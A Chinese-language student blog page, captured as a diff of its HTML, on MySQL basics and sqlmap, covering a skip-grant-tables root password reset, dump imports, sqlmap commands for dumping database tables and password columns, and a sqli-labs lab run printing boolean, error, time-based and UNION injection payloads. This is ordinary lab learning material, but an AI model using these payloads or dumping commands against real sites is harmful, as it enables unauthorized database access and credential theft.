@@ -1,0 +1,655 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    Sql |
+    
+    Flight-star&#39;blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="今天老纪约谈，狠狠压力我们，看来不得不好好学习了 学长说 sql 很重要，我觉得应该从怎么开创一个数据库开始！！当你忘记密码时候想要登入&#x2F;phpMyAdmin登入&#x2F;phpMyAdmin：1浏览器输入：http:&#x2F;&#x2F;localhost&#x2F;phpMyAdmin&#x2F;    修改配置文件找到 MySQL 配置文件（通常在 C:\ProgramData\MySQL\MySQL Server 8.0\my.in">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sql">
+<meta property="og:url" content="http://example.com/2025/06/13/Sql/index.html">
+<meta property="og:site_name" content="Flight-star&#39;blog">
+<meta property="og:description" content="今天老纪约谈，狠狠压力我们，看来不得不好好学习了 学长说 sql 很重要，我觉得应该从怎么开创一个数据库开始！！当你忘记密码时候想要登入&#x2F;phpMyAdmin登入&#x2F;phpMyAdmin：1浏览器输入：http:&#x2F;&#x2F;localhost&#x2F;phpMyAdmin&#x2F;    修改配置文件找到 MySQL 配置文件（通常在 C:\ProgramData\MySQL\MySQL Server 8.0\my.in">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/image-20250614003621608-1749832582445-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250614003910774-1749832751628-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250614004244159-1749832964806-5.png">
+<meta property="og:image" content="http://example.com/images/image-20250614004415532-1749833056158-7.png">
+<meta property="og:image" content="http://example.com/images/image-20250614005504604-1749833705198-9.png">
+<meta property="og:image" content="http://example.com/images/image-20250614005818170-1749833899338-11.png">
+<meta property="og:image" content="http://example.com/images/image-20250614005909503-1749833950153-13.png">
+<meta property="og:image" content="http://example.com/images/image-20250616012042903-1750008043960-7.png">
+<meta property="og:image" content="http://example.com/images/image-20250616000223857-1750003344737-1.png">
+<meta property="og:image" content="http://example.com/images/image-20250616010208562-1750006929838-3.png">
+<meta property="og:image" content="http://example.com/images/image-20250616010851513-1750007332136-5.png">
+<meta property="article:published_time" content="2025-06-13T15:17:41.000Z">
+<meta property="article:modified_time" content="2025-06-15T17:30:13.843Z">
+<meta property="article:author" content="Flight-star">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20250614003621608-1749832582445-1.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Flight-star'blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/friend">Friend</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="Sql">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Sql</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-Sql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/06/13/Sql/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-06-13T15:17:41.000Z" itemprop="datePublished">2025-06-13</time>
+    <time style="display: none;" id="post-update-time">2025-06-16</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p> 今天老纪约谈，狠狠压力我们，看来不得不好好学习了</p>
+<h5 id="学长说-sql-很重要，我觉得应该从怎么开创一个数据库开始！！"><a href="#学长说-sql-很重要，我觉得应该从怎么开创一个数据库开始！！" class="headerlink" title="学长说 sql 很重要，我觉得应该从怎么开创一个数据库开始！！"></a>学长说<code> sql</code> 很重要，我觉得应该从怎么开创一个数据库开始！！</h5><h2 id="当你忘记密码时候想要登入-phpMyAdmin"><a href="#当你忘记密码时候想要登入-phpMyAdmin" class="headerlink" title="当你忘记密码时候想要登入/phpMyAdmin"></a>当你忘记密码时候想要登入<code>/phpMyAdmin</code></h2><h4 id="登入-phpMyAdmin："><a href="#登入-phpMyAdmin：" class="headerlink" title="登入/phpMyAdmin："></a>登入<code>/phpMyAdmin</code>：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浏览器输入：http:<span class="comment">//localhost/phpMyAdmin/</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><p>找到 MySQL 配置文件（通常在 <code>C:\ProgramData\MySQL\MySQL Server 8.0\my.ini</code>），在 <code>[mysqld]</code> 部分添加：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line">skip-grant-tables  <span class="comment"># 跳过权限验证（临时绕过密码）</span></span><br></pre></td></tr></table></figure>
+
+<p>（记得停止服务）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqlsh -u root</span><br></pre></td></tr></table></figure>
+
+<p><strong>成功登入：</strong></p>
+<p><img src="/../images/image-20250614003621608-1749832582445-1.png" alt="image-20250614003621608"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FLUSH PRIVILEGES;			#刷新权限</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;root&#x27;</span>;    #设置密码</span><br></pre></td></tr></table></figure>
+
+<h5 id="成功登入"><a href="#成功登入" class="headerlink" title="成功登入"></a>成功登入</h5><p><img src="/../images/image-20250614003910774-1749832751628-3.png" alt="image-20250614003910774"></p>
+<h2 id="观察sql文件"><a href="#观察sql文件" class="headerlink" title="观察sql文件"></a>观察<code>sql文件</code></h2><p><img src="/../images/image-20250614004244159-1749832964806-5.png" alt="image-20250614004244159"></p>
+<h3 id="我们随机导出一个sql文件，发现："><a href="#我们随机导出一个sql文件，发现：" class="headerlink" title="我们随机导出一个sql文件，发现："></a><strong>我们随机导出一个<code>sql文件</code>，发现：</strong></h3><p><strong>出现数据</strong>：</p>
+<p><img src="/../images/image-20250614004415532-1749833056158-7.png" alt="image-20250614004415532"></p>
+<h4 id="我该怎么导入新数据呢？"><a href="#我该怎么导入新数据呢？" class="headerlink" title="我该怎么导入新数据呢？"></a>我该怎么导入新数据呢？</h4><h5 id="方法-1：通过-phpMyAdmin-导入"><a href="#方法-1：通过-phpMyAdmin-导入" class="headerlink" title="方法 1：通过 phpMyAdmin 导入"></a><strong>方法 1：通过 phpMyAdmin 导入</strong></h5><h5 id="方法-2：通过命令行导入导入"><a href="#方法-2：通过命令行导入导入" class="headerlink" title="方法 2：通过命令行导入导入"></a><strong>方法 2：通过命令行导入导入</strong></h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqlsh -u 用户名 -p 数据库名 &lt; 文件路径</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="方法-3：在-SQL-文件中直接添加新数据"><a href="#方法-3：在-SQL-文件中直接添加新数据" class="headerlink" title="方法 3：在 SQL 文件中直接添加新数据"></a>方法 3：<strong>在 SQL 文件中直接添加新数据</strong></h5><p><img src="/../images/image-20250614005504604-1749833705198-9.png" alt="image-20250614005504604"></p>
+<p>再把<strong>这个文件导入</strong>即可</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p challenges &lt; C:\data\modified_dump.sql    #相应位置</span><br><span class="line">#challenges是库名</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>/phpMyAdmin</code>法</strong></p>
+<p><img src="/../images/image-20250614005818170-1749833899338-11.png" alt="image-20250614005818170"></p>
+<p>（如果有<strong>重复列记得删一下</strong>）</p>
+<p><img src="/../images/image-20250614005909503-1749833950153-13.png" alt="image-20250614005909503"></p>
+<p><strong>成功导入</strong></p>
+<h4 id="易错点："><a href="#易错点：" class="headerlink" title="易错点："></a>易错点：</h4><p><img src="/../images/image-20250616012042903-1750008043960-7.png" alt="image-20250616012042903"></p>
+<p><strong>记得不能出现两个分号</strong></p>
+<h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a><code>sqlmap</code>使用</h2><h4 id="Kali中是自带sqlmap的："><a href="#Kali中是自带sqlmap的：" class="headerlink" title="Kali中是自带sqlmap的："></a><code>Kali</code>中是自带sqlmap的：</h4><p><img src="/../images/image-20250616000223857-1750003344737-1.png" alt="image-20250616000223857"></p>
+<h4 id="语法：（以）"><a href="#语法：（以）" class="headerlink" title="语法：（以）"></a>语法：（以）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span>				<span class="comment">#普通</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://test.com/login.php&quot;</span> --data=<span class="string">&quot;username=admin&amp;password=pass&quot;</span></span><br><span class="line">										<span class="comment">#post传输</span></span><br><span class="line">sqlmap -u &lt;URL&gt; --cookie=&lt;COOKIE&gt; --banner</span><br><span class="line">										<span class="comment">#识别指纹</span></span><br><span class="line">sqlmap -u &lt;URL&gt; --dbs</span><br><span class="line">										<span class="comment">#获取库</span></span><br><span class="line">ssqlmap -u &lt;URL&gt; -D <span class="string">&#x27;security&#x27;</span> --tables</span><br><span class="line">                                        <span class="comment">#访问&lt;security&gt;库的表</span></span><br><span class="line">sqlmap -u &lt;URL&gt; -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --tables</span><br><span class="line">										<span class="comment">#访问&lt;security&gt;库中[users]表的列</span></span><br><span class="line">sqlmap -u &lt;URL&gt; -D dvwa -T <span class="built_in">users</span> -C <span class="string">&quot;user_id,password&quot;</span> --dump</span><br><span class="line">										<span class="comment">#访问具体的列</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="返回："><a href="#返回：" class="headerlink" title="返回："></a>返回：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">it is recommended to perform only basic UNION tests <span class="keyword">if</span> there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] </span><br><span class="line">											<span class="comment">#使用union测试</span></span><br><span class="line">											<span class="comment">#Y是，n是不用</span></span><br><span class="line">											</span><br><span class="line">it looks like the back-end DBMS is <span class="string">&#x27;MySQL&#x27;</span>. Do you want to skip <span class="built_in">test</span> payloads specific <span class="keyword">for</span> other DBMSes? [Y/n]</span><br><span class="line">											<span class="comment">#看上去像mysql，是否只用mysql</span></span><br><span class="line">											<span class="comment">#Y是</span></span><br><span class="line">											</span><br><span class="line"><span class="keyword">for</span> the remaining tests, <span class="keyword">do</span> you want to include all tests <span class="keyword">for</span> <span class="string">&#x27;MySQL&#x27;</span> extending provided level (1) and risk (1) values? [Y/n] </span><br><span class="line">											<span class="comment">#是否需要认真扫描，还是只需要level-1</span></span><br><span class="line">											<span class="comment">#Y是要认真，n是只需要level-1模式</span></span><br><span class="line">											</span><br><span class="line">GET parameter <span class="string">&#x27;id&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="keyword">if</span> any)? [y/N]</span><br><span class="line">										<span class="comment">#`id`这个确定为注入点，还要找其他注入点吗</span></span><br><span class="line">										<span class="comment">#y需要，N不需要</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="以sqli-labs为例子："><a href="#以sqli-labs为例子：" class="headerlink" title="以sqli-labs为例子："></a>以<code>sqli-labs</code>为例子：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://172.29.37.209/sqli-labs-master/Less-3/?id=1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h5><p><img src="/../images/image-20250616010208562-1750006929838-3.png" alt="image-20250616010208562"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: <span class="built_in">id</span> (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: <span class="built_in">id</span>=1<span class="string">&#x27;) AND 3903=3903 AND (&#x27;</span>ytjT<span class="string">&#x27;=&#x27;</span>ytjT</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: <span class="built_in">id</span>=1<span class="string">&#x27;) AND GTID_SUBSET(CONCAT(0x7176707071,(SELECT (ELT(8776=8776,1))),0x717a767071),8776) AND (&#x27;</span>aYiq<span class="string">&#x27;=&#x27;</span>aYiq</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="built_in">id</span>=1<span class="string">&#x27;) AND (SELECT 5362 FROM (SELECT(SLEEP(5)))GuAf) AND (&#x27;</span>DXUK<span class="string">&#x27;=&#x27;</span>DXUK</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: <span class="built_in">id</span>=-4852<span class="string">&#x27;) UNION ALL SELECT NULL,NULL,CONCAT(0x7176707071,0x654c714b6763476b4d5156415a654344735065456a6f57784f67414475716f4e654c7249597a7754,0x717a767071)-- -</span></span><br><span class="line"><span class="string">---</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="确定存在即可："><a href="#确定存在即可：" class="headerlink" title="确定存在即可："></a>确定存在即可：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://172.29.37.209/sqli-labs-master/Less-3/?id=1&#x27;</span> --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250616010851513-1750007332136-5.png" alt="image-20250616010851513"></p>
+<p><strong>成功</strong></p>
+<h4 id="POST链接测试："><a href="#POST链接测试：" class="headerlink" title="POST链接测试："></a><code>POST</code>链接测试：</h4>
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/shopping.jpg" data-sizes="auto" alt="H&amp;NCTF" class="lazyload">
+        
+      
+      <a href="/2025/06/07/H-NCTF/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          H&amp;NCTF
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%A6%E9%95%BF%E8%AF%B4-sql-%E5%BE%88%E9%87%8D%E8%A6%81%EF%BC%8C%E6%88%91%E8%A7%89%E5%BE%97%E5%BA%94%E8%AF%A5%E4%BB%8E%E6%80%8E%E4%B9%88%E5%BC%80%E5%88%9B%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BC%80%E5%A7%8B%EF%BC%81%EF%BC%81"><span class="toc-number">1.</span> <span class="toc-text">学长说 sql 很重要，我觉得应该从怎么开创一个数据库开始！！</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%93%E4%BD%A0%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81%E6%97%B6%E5%80%99%E6%83%B3%E8%A6%81%E7%99%BB%E5%85%A5-phpMyAdmin"><span class="toc-number"></span> <span class="toc-text">当你忘记密码时候想要登入&#x2F;phpMyAdmin</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E5%85%A5-phpMyAdmin%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">登入&#x2F;phpMyAdmin：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number"></span> <span class="toc-text">修改配置文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E7%99%BB%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">成功登入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%82%E5%AF%9Fsql%E6%96%87%E4%BB%B6"><span class="toc-number"></span> <span class="toc-text">观察sql文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E9%9A%8F%E6%9C%BA%E5%AF%BC%E5%87%BA%E4%B8%80%E4%B8%AAsql%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%91%E7%8E%B0%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">我们随机导出一个sql文件，发现：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%91%E8%AF%A5%E6%80%8E%E4%B9%88%E5%AF%BC%E5%85%A5%E6%96%B0%E6%95%B0%E6%8D%AE%E5%91%A2%EF%BC%9F"><span class="toc-number"></span> <span class="toc-text">我该怎么导入新数据呢？</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-1%EF%BC%9A%E9%80%9A%E8%BF%87-phpMyAdmin-%E5%AF%BC%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">方法 1：通过 phpMyAdmin 导入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-2%EF%BC%9A%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">方法 2：通过命令行导入导入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-3%EF%BC%9A%E5%9C%A8-SQL-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9B%B4%E6%8E%A5%E6%B7%BB%E5%8A%A0%E6%96%B0%E6%95%B0%E6%8D%AE"><span class="toc-number">3.</span> <span class="toc-text">方法 3：在 SQL 文件中直接添加新数据</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%93%E9%94%99%E7%82%B9%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">易错点：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E4%BD%BF%E7%94%A8"><span class="toc-number"></span> <span class="toc-text">sqlmap使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Kali%E4%B8%AD%E6%98%AF%E8%87%AA%E5%B8%A6sqlmap%E7%9A%84%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">Kali中是自带sqlmap的：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%EF%BC%9A%EF%BC%88%E4%BB%A5%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">语法：（以）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">返回：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A5sqli-labs%E4%B8%BA%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">以sqli-labs为例子：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">结果：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%AD%98%E5%9C%A8%E5%8D%B3%E5%8F%AF%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">确定存在即可：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST%E9%93%BE%E6%8E%A5%E6%B5%8B%E8%AF%95%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">POST链接测试：</span></a>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Flight-star" class="lazyload">
+  <div class="sidebar-author-name">Flight-star</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">69</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep"></span>
+      Flight-star
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        65.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:01
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
